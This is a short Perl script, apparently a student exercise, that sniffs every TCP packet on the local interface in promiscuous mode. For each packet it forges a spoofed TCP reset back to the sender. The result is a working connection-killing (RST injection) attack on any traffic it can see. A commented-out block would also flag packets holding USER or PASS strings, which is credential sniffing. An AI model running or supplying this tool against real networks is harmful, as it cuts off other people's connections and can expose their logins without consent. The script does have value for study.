#!/usr/bin/env perl 
#===============================================================================
#         FILE: synopsis.pl
#       AUTHOR: Phoenix Ikki (liuxueyang.github.io), liuxueyang457@gmail.com
# ORGANIZATION: Hunan University
#      CREATED: 05/03/2015 03:50:18 PM
#===============================================================================

use strict;
use warnings;
use utf8;
use 5.014;
use Net::Pcap;
use Net::PcapUtils;
use NetPacket::Ethernet qw(:strip);
use NetPacket::TCP;
use NetPacket::IP qw(:strip);
use Net::RawIP;

die "You need EUID 0 to use this tool!\n\n" if $>;

my $err = '';
my $dev = pcap_lookupdev(\$err);  # find a device

print "dev = $dev\n";
# open the device for live listening
#my $pcap = pcap_open_live($dev, 1024, 1, 0, \$err);

# loop over next 10 packets
#pcap_loop($pcap, 10, \&process_packet, "just for the demo");

# close the device
#pcap_close($pcap);

Net::PcapUtils::loop(\&process_packet,
Promisc => 1,
FILTER => 'tcp',
DEV => $dev);

sub process_packet {
    my ($user_data, $header, $m_packet) = @_;
    # do something ...
    my $ip = NetPacket::IP->decode(eth_strip($m_packet));
    my $tcp = NetPacket::TCP->decode($ip->{data});
    my $payload = $tcp->{data};
#    if (($payload =~ /USER/) || ($payload =~ /PASS/)) {
#        print "Got ya! =)\n\n";
#    }

    my $packet = new Net::RawIP;
    $packet->set({
        ip => {saddr => $ip->{dest_ip},
        daddr => $ip->{src_ip}},
        tcp => {source => $tcp->{dest_port},
        dest => $tcp->{src_port},
        rst => 1,
        seq => $ip->{acknum},
        data => 'I am a fake! =)'}
    });
    print "$ip->{src_ip}:$tcp->{src_port} -> $ip->{dest_ip}".
    ":$tcp->{dest_port}\n";

    $packet->send(0, 1);
    print "Reset send $ip->{dest_ip}:$tcp->{dest_port} -> ".
    "$ip->{src_ip}:$tcp->{src_port}\n";

#    print "Payload:\n$payload\n\n";
}

